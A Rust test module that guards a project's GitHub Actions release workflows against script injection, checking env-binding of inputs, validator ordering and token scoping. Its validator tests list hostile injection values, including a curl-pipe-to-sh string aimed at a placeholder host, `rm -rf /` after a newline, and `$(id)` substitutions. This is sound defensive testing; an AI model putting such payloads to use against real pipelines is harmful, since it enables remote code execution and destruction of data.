//! Tests for the rule that keeps a workflow's outside values out of its shell:
//! no `${{ }}` inside a `run:` body, and free-form values judged in a step of
//! their own before anything uses them.
//!
//! `${{ }}` is substituted while a step's script is being *generated*, so an
//! interpolated value is part of the script rather than data the script reads.
//! `release.yml`'s `Calculate new version` used to paste `custom_version` in
//! and then validate the result two lines below; a value carrying a quote and a
//! newline put its second line outside the `if` and made that check
//! unreachable. `release-deploy.yml` — the workflow that runs `cargo publish` —
//! did the same with a pushed tag name and two free-form dispatch inputs, and
//! judged none of them anywhere. Both files now bind their outside values under
//! `env:` and hand them to a script in a step that runs first:
//! `.github/scripts/validate-custom-version.sh`, which is the one statement of
//! the version grammar, and `.github/scripts/validate-deploy-inputs.sh`, which
//! delegates to it.
//!
//! **Scope: every workflow in `.github/workflows/`.** `WORKFLOWS` below names
//! them, and `every_workflow_in_the_directory_is_accounted_for` reads the
//! directory at test time and fails if it finds a file that is in neither
//! `WORKFLOWS` nor `EXEMPT`. That test is the point of this module's name being
//! wider than one file: this issue existed *because* a second workflow sat
//! outside a guard whose name implied it covered the repository, and a list
//! that a comment asks you to remember to extend is the same gap written down.
//! A new workflow makes the suite red until somebody decides which list it
//! belongs in.
//!
//! They live in the lib rather than `tests/`, for the reason stated at
//! `src/elements.rs`'s `showcase_coverage`: `cargo test --lib` is the command
//! that works in a constrained environment. The parser asserts it matched
//! something before anything else is trusted, and there is a fixture it is run
//! against, for the same reason `release_version_guard` does — a parser that
//! silently found nothing reports success.

use std::path::PathBuf;
use std::process::Command;

const RELEASE_YML: &str = include_str!("../.github/workflows/release.yml");
const RELEASE_DEPLOY_YML: &str = include_str!("../.github/workflows/release-deploy.yml");
const CI_YML: &str = include_str!("../.github/workflows/ci.yml");

/// The validator `release.yml` calls, and the one statement of the version
/// grammar in this repository. Named once so a rename fails in one place.
const SCRIPT: &str = ".github/scripts/validate-custom-version.sh";

/// The validator `release-deploy.yml` calls. It states no grammar of its own —
/// it hands the version to `SCRIPT` — and adds the two things that are that
/// workflow's policy rather than the grammar: the empty value is rejected, and
/// the tag must be `v` followed by the version.
const DEPLOY_SCRIPT: &str = ".github/scripts/validate-deploy-inputs.sh";

/// Every workflow held to the no-interpolation rule: its file name, its text,
/// and the number of `run:` bodies it had when it was added.
///
/// The count is a **floor**, not an equality: steps get added, and a change
/// that adds one has done nothing wrong. It exists so that a parser which
/// stopped recognising anything cannot pass the "no interpolation" test by
/// finding nothing to check.
///
/// Adding a file here is not what puts it under the rule — being in
/// `.github/workflows/` is. `every_workflow_in_the_directory_is_accounted_for`
/// compares this list against the directory.
const WORKFLOWS: [(&str, &str, usize); 3] = [
    ("release.yml", RELEASE_YML, 10),
    ("release-deploy.yml", RELEASE_DEPLOY_YML, 8),
    ("ci.yml", CI_YML, 12),
];

/// Workflows deliberately outside the rule, each with the reason it is outside
/// it. Empty today, and named rather than absent on purpose: an exemption a
/// reader can see and a test enforces is a different thing from a file nobody
/// ever thought about. Anything put here should say why interpolation is
/// legitimate in it, not that fixing it is somebody else's change.
const EXEMPT: [(&str, &str); 0] = [];

fn repo_root() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
}

/// One `run:` body, with the 1-based line its `run:` key sits on.
#[derive(Debug)]
struct RunBody {
    line: usize,
    text: String,
}

fn indent_of(line: &str) -> usize {
    line.len() - line.trim_start().len()
}

/// Every `run:` body in a workflow, and nothing else.
///
/// Handles both shapes this repository uses: `run: <command>` on one line, and
/// a `run: |` block scalar whose body is every following line indented past the
/// `run:` key. Deliberately narrow — `env:` bindings, `with:` values, job
/// outputs and the file's own comments all contain `${{` legitimately, and only
/// a `run:` body is a shell script.
fn run_bodies(yaml: &str) -> Vec<RunBody> {
    let lines: Vec<&str> = yaml.lines().collect();
    let mut bodies = Vec::new();
    let mut i = 0;

    while i < lines.len() {
        let line = lines[i];
        let trimmed = line.trim_start();
        let Some(rest) = trimmed.strip_prefix("run:") else {
            i += 1;
            continue;
        };
        let key_indent = indent_of(line);
        let rest = rest.trim();

        // A block scalar: `|`, `|-`, `>`, and their chomping variants.
        if rest.starts_with('|') || rest.starts_with('>') {
            let mut text = String::new();
            let mut j = i + 1;
            while j < lines.len() {
                let body_line = lines[j];
                if !body_line.trim().is_empty() && indent_of(body_line) <= key_indent {
                    break;
                }
                text.push_str(body_line);
                text.push('\n');
                j += 1;
            }
            bodies.push(RunBody { line: i + 1, text });
            i = j;
        } else {
            bodies.push(RunBody {
                line: i + 1,
                text: rest.to_string(),
            });
            i += 1;
        }
    }

    bodies
}

/// The file with every whole-line comment blanked out, line count preserved.
///
/// The ordering tests below locate steps by searching for a substring, and a
/// workflow that documents its own rule necessarily names the things they
/// search for: `release-deploy.yml`'s header comment says `cargo publish`, so
/// an unfiltered `find` matched the prose at the top of the file and ordered
/// the file against its own header. `release.yml`'s ordering test had the same
/// fragility and only happened to pass. Only whole-line comments are removed: a
/// `#` inside a `run:` body is part of a script, and inside a quoted string it
/// is data.
fn without_comments(yaml: &str) -> String {
    yaml.lines()
        .map(|line| {
            if line.trim_start().starts_with('#') {
                ""
            } else {
                line
            }
        })
        .collect::<Vec<_>>()
        .join("\n")
}

/// One step, from its `- name:` line to the next line indented no further than
/// it — the next step, or the end of the job.
fn step_body<'a>(yaml: &'a str, name: &str) -> &'a str {
    let needle = format!("- name: {name}\n");
    let at = yaml.find(&needle).unwrap_or_else(|| {
        panic!(
            "no step named `{name}`. If it was renamed, rename it here too — \
             otherwise this test passes by finding nothing"
        )
    });
    let start = yaml[..at].rfind('\n').map_or(0, |i| i + 1);
    let key_indent = at - start;
    let mut end = at + needle.len();

    for line in yaml[end..].split_inclusive('\n') {
        if !line.trim().is_empty() && indent_of(line) <= key_indent {
            break;
        }
        end += line.len();
    }

    &yaml[start..end]
}

/// The byte range of one job, from its key to the next key at job indentation.
fn job_range(yaml: &str, job: &str) -> std::ops::Range<usize> {
    let needle = format!("\n  {job}:\n");
    let at = yaml
        .find(&needle)
        .unwrap_or_else(|| panic!("no job named `{job}`. If it was renamed, rename it here too"));
    let start = at + 1;
    let mut end = start + needle.len() - 1;

    for line in yaml[end..].split_inclusive('\n') {
        if !line.trim().is_empty() && indent_of(line) <= 2 {
            break;
        }
        end += line.len();
    }

    start..end
}

/// A workflow shaped like the ones here, carrying exactly one interpolated
/// `run:` body, so that the detector is checked against a known answer rather
/// than only against a file that is expected to be clean.
const FIXTURE: &str = r#"# A comment mentioning ${{ inputs.thing }}, which is not a script.
name: Fixture
on:
  workflow_dispatch:
    inputs:
      thing:
        type: string
jobs:
  demo:
    runs-on: ubuntu-latest
    steps:
      - name: Bound properly
        env:
          THING: ${{ inputs.thing }}
        run: |
          echo "$THING"
      - name: Interpolated
        run: |
          echo "${{ inputs.thing }}"
      - name: One-liner
        run: echo clean
      - name: Uses an action
        uses: actions/checkout@v4
        with:
          ref: ${{ inputs.thing }}
"#;

#[test]
fn the_run_body_parser_sees_an_interpolated_body_and_only_that() {
    let bodies = run_bodies(FIXTURE);

    assert_eq!(
        bodies.len(),
        3,
        "the fixture has three `run:` bodies — two blocks and a one-liner — and the \
         parser found {}: {bodies:#?}",
        bodies.len()
    );

    let interpolated: Vec<usize> = bodies
        .iter()
        .filter(|b| b.text.contains("${{"))
        .map(|b| b.line)
        .collect();

    assert_eq!(
        interpolated.len(),
        1,
        "the fixture interpolates into exactly one `run:` body; the parser called it \
         {interpolated:?}. Either it cannot see an interpolated body, or it mistook \
         the comment, the `env:` binding or the `with:` value for one"
    );

    let clean = bodies
        .iter()
        .find(|b| b.text.contains("$THING"))
        .expect("the parser lost the body that reads the env binding");
    assert!(
        !clean.text.contains("${{"),
        "the `env:` binding above a body leaked into the body: {clean:#?}"
    );

    assert!(
        bodies.iter().any(|b| b.text.trim() == "echo clean"),
        "the `run: <command>` one-liner shape was not parsed: {bodies:#?}"
    );
}

/// The rule itself, over every workflow in `WORKFLOWS`. `${{ }}` inside a
/// `run:` body is substituted before the shell sees it, so the value is code
/// rather than data and nothing written inside that body can judge it in time.
#[test]
fn no_run_body_in_a_release_workflow_interpolates_a_workflow_expression() {
    for (name, yaml, floor) in WORKFLOWS {
        let bodies = run_bodies(yaml);

        assert!(
            bodies.len() >= floor,
            "the parser found only {} `run:` bodies in {name}, below the floor of \
             {floor}. Either most steps were deleted or the parser stopped working — \
             and a parser that finds nothing passes the check below for free",
            bodies.len()
        );

        let offenders: Vec<String> = bodies
            .iter()
            .filter(|b| b.text.contains("${{"))
            .map(|b| format!("line {}:\n{}", b.line, b.text))
            .collect();

        assert!(
            offenders.is_empty(),
            "{name} interpolates a workflow expression into a `run:` body. Bind the \
             value under `env:` and read it as \"$NAME\" instead — see the rule at the \
             top of the file:\n\n{}",
            offenders.join("\n")
        );
    }
}

/// The list is closed, not documented. `.github/workflows/` is read here rather
/// than `include_str!`ed, because the whole point is to notice a file nobody has
/// thought about yet — which is exactly what a compile-time include cannot do.
/// A workflow that genuinely needs interpolation goes in `EXEMPT` with its
/// reason; what must not happen again is a workflow that is in neither list.
#[test]
fn every_workflow_in_the_directory_is_accounted_for() {
    let dir = repo_root().join(".github/workflows");
    let mut on_disk: Vec<String> = std::fs::read_dir(&dir)
        .unwrap_or_else(|e| panic!("cannot read {}: {e}", dir.display()))
        .map(|entry| entry.expect("a readable directory entry").file_name())
        .map(|name| name.to_string_lossy().into_owned())
        .filter(|name| name.ends_with(".yml") || name.ends_with(".yaml"))
        .collect();
    on_disk.sort();

    assert!(
        !on_disk.is_empty(),
        "no workflows found in {} — this test is checking nothing",
        dir.display()
    );

    let named: Vec<&str> = WORKFLOWS
        .iter()
        .map(|(name, _, _)| *name)
        .chain(EXEMPT.iter().map(|(name, _)| *name))
        .collect();

    let unguarded: Vec<&String> = on_disk
        .iter()
        .filter(|f| !named.contains(&f.as_str()))
        .collect();
    assert!(
        unguarded.is_empty(),
        "{unguarded:?} in .github/workflows/ is in neither WORKFLOWS nor EXEMPT, so \
         nothing holds it to the no-interpolation rule. Add it to WORKFLOWS with a \
         floor for its `run:` bodies, or to EXEMPT with the reason interpolation is \
         legitimate in it"
    );

    let missing: Vec<&str> = named
        .iter()
        .filter(|n| !on_disk.iter().any(|f| f.as_str() == **n))
        .copied()
        .collect();
    assert!(
        missing.is_empty(),
        "{missing:?} is named here but is not in .github/workflows/ — a renamed or \
         deleted workflow leaves this list describing a file that no longer exists"
    );
}

/// The input this was reported about, specifically: it may appear as the
/// right-hand side of an `env:` binding and nowhere else.
#[test]
fn custom_version_reaches_the_shell_only_as_an_env_binding() {
    let mentions: Vec<(usize, &str)> = RELEASE_YML
        .lines()
        .enumerate()
        .filter(|(_, line)| line.contains("inputs.custom_version"))
        .map(|(i, line)| (i + 1, line.trim()))
        .collect();

    assert!(
        !mentions.is_empty(),
        "release.yml no longer reads the custom_version input at all, so this test is \
         checking nothing"
    );

    for (line, text) in &mentions {
        let bound = text.split_once(": ").is_some_and(|(name, value)| {
            !name.is_empty()
                && name.chars().all(|c| c.is_ascii_uppercase() || c == '_')
                && value.trim() == "${{ inputs.custom_version }}"
        });
        assert!(
            bound,
            "line {line} uses the custom_version input somewhere other than an `env:` \
             binding: {text}"
        );
    }
}

/// A validator that runs after the value has been used is not a validator. It
/// has to precede the step that computes the version from it, and every step
/// that writes something.
#[test]
fn the_validator_runs_before_anything_uses_the_version() {
    // Comments stripped: the header comment names the step below, and a file
    // that documents its own rule would otherwise be ordered against its prose.
    let yaml = without_comments(RELEASE_YML);
    let validator = yaml
        .find(SCRIPT)
        .unwrap_or_else(|| panic!("release.yml no longer calls {SCRIPT}"));

    for user in [
        "- name: Calculate new version",
        "cargo set-version",
        "git tag -a",
        "git push origin",
    ] {
        let at = yaml.find(user).unwrap_or_else(|| {
            panic!(
                "release.yml no longer contains `{user}`. If the step was renamed, \
                 update this list — otherwise this test passes by finding nothing"
            )
        });
        assert!(
            validator < at,
            "`{user}` comes before the custom_version validator, so the value is used \
             before it is judged"
        );
    }
}

/// The step exists, still binds the input, still hands it to the script, and is
/// not skipped. The empty value is what every `version_type` dispatch sends and
/// the script accepts it, so there is nothing for an `if:` to save.
#[test]
fn the_validation_step_binds_the_input_and_passes_it_on() {
    let start = RELEASE_YML
        .find("      - name: Validate custom_version")
        .expect("the validation step was renamed; update this test with it");
    let rest = &RELEASE_YML[start + 1..];
    let end = rest
        .find("\n      - name: ")
        .expect("the validation step is never closed by another step");
    let step = &rest[..end];

    assert!(
        step.contains("CUSTOM_VERSION: ${{ inputs.custom_version }}"),
        "the validation step no longer binds the input, so it is judging something \
         else:\n{step}"
    );
    assert!(
        step.contains(SCRIPT) && step.contains("\"$CUSTOM_VERSION\""),
        "the validation step no longer passes the bound value to {SCRIPT}:\n{step}"
    );
    assert!(
        !step.contains("if:"),
        "the validation step grew an `if:`, so some dispatch reaches the shell \
         unjudged:\n{step}"
    );
}

fn run_validator(argv: &[&str]) -> std::process::Output {
    Command::new("bash")
        .arg(repo_root().join(SCRIPT))
        .args(argv)
        .output()
        .expect("bash is available to run the validator")
}

#[test]
fn the_workflow_calls_a_validator_that_exists() {
    assert!(
        repo_root().join(SCRIPT).exists(),
        "{SCRIPT} is gone, and release.yml calls it"
    );
    assert!(
        RELEASE_YML.contains(SCRIPT),
        "release.yml no longer calls {SCRIPT}, so nothing judges custom_version before \
         the shell sees it"
    );
}

/// The empty value is in this list on purpose: it is what a `version_type`
/// dispatch sends, and a validator that rejected it would break the ordinary
/// release path.
#[test]
fn the_validator_accepts_a_version_and_the_empty_value() {
    for version in ["1.2.3", "0.8.0", "1.2.3-beta.1", "10.20.30-rc.2", ""] {
        let out = run_validator(&[version]);
        assert!(
            out.status.success(),
            "the validator rejected `{version}`, which is a value a real dispatch \
             sends:\n{}",
            String::from_utf8_lossy(&out.stderr)
        );
    }
}

/// The two-line cases are the reason the check is bash `[[ =~ ]]` rather than
/// the `echo | grep -qE '^…$'` it replaces: `grep` judges one line at a time,
/// so a value whose first line is a version passed however it continued.
#[test]
fn the_validator_rejects_everything_that_is_not_a_version() {
    for version in [
        "v1.2.3",
        "1.2",
        "1.2.3.4",
        " 1.2.3",
        "1.2.3 ",
        "latest",
        "1.2.3; id",
        "$(id)",
        "`id`",
        "1.2.3\"; curl http://example.invalid/x | sh; \"",
        "1.2.3\nrm -rf /",
    ] {
        let out = run_validator(&[version]);
        assert_eq!(
            out.status.code(),
            Some(1),
            "the validator answered {:?} for {version:?}; 1 is `not a version`",
            out.status.code()
        );
    }
}

/// A wiring mistake and a mistyped version are different problems with
/// different fixes, so they get different codes. Kept distinct deliberately.
#[test]
fn the_validator_reports_a_usage_error_separately() {
    let out = run_validator(&[]);
    assert_eq!(
        out.status.code(),
        Some(2),
        "called with no argument the validator answered {:?}; 2 is `wired up wrong`, \
         and must stay distinct from 1, `not a version`",
        out.status.code()
    );
}

// ---------------------------------------------------------------------------
// release-deploy.yml — the workflow that publishes.
//
// Everything above is asserted about `release.yml` specifically; these are the
// same assertions about the file that runs `cargo publish`, where the values
// arrive from a pushed tag name as well as from a dispatch.
// ---------------------------------------------------------------------------

/// The six values that reach `release-deploy.yml` from outside it: the event
/// name and ref of a tag push, the two free-form dispatch inputs, and the step
/// outputs the later jobs read them back through.
const OUTSIDE_VALUES: [&str; 6] = [
    "github.event_name",
    "github.ref_name",
    "inputs.version",
    "inputs.tag",
    "needs.prepare.outputs.version",
    "needs.prepare.outputs.tag",
];

/// `prepare` had no checkout at all — nothing in it read the repository. A
/// validation step calling a script in this repository needs one, and it is the
/// single non-obvious dependency in this change.
#[test]
fn prepare_checks_out_the_repository_before_it_validates() {
    let prepare = &RELEASE_DEPLOY_YML[job_range(RELEASE_DEPLOY_YML, "prepare")];

    let checkout = prepare.find("uses: actions/checkout@v4").expect(
        "the `prepare` job has no checkout, so the validator it calls is not on disk \
         when the step runs",
    );
    let validator = prepare
        .find(DEPLOY_SCRIPT)
        .unwrap_or_else(|| panic!("the `prepare` job no longer calls {DEPLOY_SCRIPT}"));

    assert!(
        checkout < validator,
        "the checkout comes after the validator call in `prepare`, so the script is \
         not there yet:\n{prepare}"
    );
    assert!(
        !prepare[checkout..validator].contains("ref:"),
        "`prepare`'s checkout acquired a `ref:`. It must not have one: the ref it \
         would be given is the tag this job exists to judge:\n{prepare}"
    );
}

/// No outside value reaches a `run:` body, in either direction — neither the
/// raw trigger values nor the step outputs derived from them.
#[test]
fn no_outside_value_reaches_a_run_body_in_release_deploy() {
    let bodies = run_bodies(RELEASE_DEPLOY_YML);

    for value in OUTSIDE_VALUES {
        assert!(
            RELEASE_DEPLOY_YML.contains(value),
            "release-deploy.yml no longer mentions `{value}` anywhere, so this test is \
             checking nothing for it"
        );

        let offenders: Vec<String> = bodies
            .iter()
            .filter(|b| b.text.contains(value))
            .map(|b| format!("line {}:\n{}", b.line, b.text))
            .collect();

        assert!(
            offenders.is_empty(),
            "`{value}` is interpolated into a `run:` body of release-deploy.yml. Bind \
             it under `env:` and read it as \"$NAME\":\n\n{}",
            offenders.join("\n")
        );
    }
}

/// The validator has to precede everything that acts on the values: the
/// `$GITHUB_OUTPUT` writes in its own step (a file of `name=value` lines, so an
/// unjudged version carrying a newline sets step outputs of its own), the
/// publish, and the release the `skip_publish` route still reaches.
#[test]
fn the_deploy_validator_runs_before_anything_is_written_or_published() {
    let yaml = without_comments(RELEASE_DEPLOY_YML);
    let validator = yaml
        .find(DEPLOY_SCRIPT)
        .unwrap_or_else(|| panic!("release-deploy.yml no longer calls {DEPLOY_SCRIPT}"));

    for user in [
        ">> $GITHUB_OUTPUT",
        "cargo publish",
        "softprops/action-gh-release",
    ] {
        let at = yaml.find(user).unwrap_or_else(|| {
            panic!(
                "release-deploy.yml no longer contains `{user}`. If it was renamed, \
                 update this list — otherwise this test passes by finding nothing"
            )
        });
        assert!(
            validator < at,
            "`{user}` comes before the validator, so the version and tag are acted on \
             before they are judged"
        );
    }
}

/// The step binds all four routes in, hands both values to the validator, and
/// is not skipped: an `if:` here would be a route to the publish that nothing
/// judges.
#[test]
fn the_deploy_validation_step_binds_every_route_and_passes_both_values() {
    let step = step_body(RELEASE_DEPLOY_YML, "Validate version and tag");

    for binding in [
        "EVENT_NAME: ${{ github.event_name }}",
        "REF_NAME: ${{ github.ref_name }}",
        "INPUT_VERSION: ${{ inputs.version }}",
        "INPUT_TAG: ${{ inputs.tag }}",
    ] {
        assert!(
            step.contains(binding),
            "the validation step no longer binds `{binding}`, so one route in reaches \
             the shell by another means:\n{step}"
        );
    }

    assert!(
        step.contains(DEPLOY_SCRIPT) && step.contains("\"$VERSION\" \"$TAG\""),
        "the validation step no longer hands both values to {DEPLOY_SCRIPT}:\n{step}"
    );
    assert!(
        !step.contains("if:"),
        "the validation step grew an `if:`, so some route reaches the publish \
         unjudged:\n{step}"
    );

    // Vacuity: the check above is a `!contains`, which a step reader that
    // returned the wrong slice would pass for free. This step really has one.
    assert!(
        step_body(RELEASE_YML, "Update Cargo.toml version").contains("if:"),
        "the step reader cannot see an `if:` it is looking at, so the assertion above \
         proves nothing"
    );
}

/// The crates.io credential belongs to the job that publishes. It was set at
/// workflow level, which put it in the environment of `prepare` — the job that
/// handles an unjudged tag name — for no reason.
#[test]
fn the_registry_token_is_scoped_to_the_publish_job() {
    let publish = job_range(RELEASE_DEPLOY_YML, "publish");
    let mentions: Vec<usize> = RELEASE_DEPLOY_YML
        .match_indices("CARGO_REGISTRY_TOKEN")
        .map(|(at, _)| at)
        .collect();

    // Two per binding — the name and the secret it reads — so this counts
    // mentions rather than asserting a number.
    assert!(
        !mentions.is_empty(),
        "release-deploy.yml no longer mentions CARGO_REGISTRY_TOKEN at all. If \
         publishing stopped needing it, delete this test with it; otherwise the \
         credential is arriving by some other route this test cannot see"
    );

    let outside: Vec<usize> = mentions
        .iter()
        .copied()
        .filter(|at| !publish.contains(at))
        .collect();

    assert!(
        outside.is_empty(),
        "CARGO_REGISTRY_TOKEN is set outside the `publish` job (at {outside:?}; the \
         job is bytes {publish:?}). At workflow level it is in the environment of \
         every job, including `prepare`, which handles an unjudged tag name and has \
         no use for the crates.io credential"
    );
}

/// One statement of the grammar, reachable from both workflows. A copied regex
/// is the easy edit and the one that goes unnoticed, so it is asserted against.
#[test]
fn the_deploy_validator_delegates_the_grammar_rather_than_restating_it() {
    let path = repo_root().join(DEPLOY_SCRIPT);
    assert!(
        path.exists(),
        "{DEPLOY_SCRIPT} is gone, and release-deploy.yml calls it"
    );
    let script = std::fs::read_to_string(&path).expect("the validator is readable");

    assert!(
        script.contains("validate-custom-version.sh"),
        "{DEPLOY_SCRIPT} no longer delegates to the script that states the version \
         grammar"
    );
    for restatement in ["[0-9]", "=~"] {
        assert!(
            !script.contains(restatement),
            "{DEPLOY_SCRIPT} contains `{restatement}`, which reads like a second copy \
             of the version grammar. There is one statement of it, in {SCRIPT}, and \
             this script delegates to it"
        );
    }
}

fn run_deploy_validator(argv: &[&str]) -> std::process::Output {
    Command::new("bash")
        .arg(repo_root().join(DEPLOY_SCRIPT))
        .args(argv)
        .output()
        .expect("bash is available to run the validator")
}

#[test]
fn the_deploy_validator_accepts_a_version_and_its_tag() {
    for (version, tag) in [
        ("1.2.3", "v1.2.3"),
        ("0.8.0", "v0.8.0"),
        ("1.2.3-beta.1", "v1.2.3-beta.1"),
        ("10.20.30-rc.2", "v10.20.30-rc.2"),
    ] {
        let out = run_deploy_validator(&[version, tag]);
        assert!(
            out.status.success(),
            "the validator rejected `{version}` / `{tag}`, which is what an ordinary \
             release sends:\n{}",
            String::from_utf8_lossy(&out.stderr)
        );
    }
}

/// The first four pairs are what a `push` of a hostile ref produces: the step
/// derives `VERSION` from the ref by stripping a leading `v`, so both values
/// carry it. The empty version is the one `validate-custom-version.sh` accepts
/// and this workflow must not: it has no bump type to compute a release from.
#[test]
fn the_deploy_validator_rejects_everything_else() {
    for (version, tag) in [
        ("1.2.3\";id;\"", "v1.2.3\";id;\""),
        ("1.2.3$(id)", "v1.2.3$(id)"),
        ("1.2.3`id`", "v1.2.3`id`"),
        ("1.2.3\nversion=9.9.9", "v1.2.3\nversion=9.9.9"),
        ("", "v"),
        ("", ""),
        ("v1.2.3", "vv1.2.3"),
        ("latest", "vlatest"),
        ("1.2", "v1.2"),
        ("0.8.0", "v0.7.0"),
        ("0.8.0", "0.8.0"),
        ("0.8.0", "release-0.8.0"),
    ] {
        let out = run_deploy_validator(&[version, tag]);
        assert_eq!(
            out.status.code(),
            Some(1),
            "the validator answered {:?} for {version:?} / {tag:?}; 1 is `not usable`",
            out.status.code()
        );
    }
}

/// A wiring mistake and a wrong value are different problems with different
/// fixes, so they keep different codes — including a 2 that came out of the
/// script this one delegates to.
#[test]
fn the_deploy_validator_reports_a_usage_error_separately() {
    for argv in [&[][..], &["1.2.3"][..], &["1.2.3", "v1.2.3", "extra"][..]] {
        let out = run_deploy_validator(argv);
        assert_eq!(
            out.status.code(),
            Some(2),
            "called with {argv:?} the validator answered {:?}; 2 is `wired up wrong`, \
             and must stay distinct from 1, `not usable`",
            out.status.code()
        );
    }
}

/// A rejection has to say what was wrong with which value. The grammar's own
/// message is kept rather than replaced, because it is the one that names the
/// grammar; the mismatch message names both values, since neither is obviously
/// the wrong one.
#[test]
fn a_rejection_says_which_value_was_wrong() {
    let bad_version = run_deploy_validator(&["v1.2.3", "vv1.2.3"]);
    let text = String::from_utf8_lossy(&bad_version.stderr);
    assert!(
        text.contains("Expected semver"),
        "the grammar's own rejection message was swallowed, so the log no longer says \
         what a version looks like:\n{text}"
    );

    let mismatch = run_deploy_validator(&["0.8.0", "v0.7.0"]);
    let text = String::from_utf8_lossy(&mismatch.stderr);
    assert!(
        text.contains("0.8.0") && text.contains("v0.7.0"),
        "the mismatch message names neither value, so nobody reading the log can tell \
         which of the two was meant:\n{text}"
    );
}
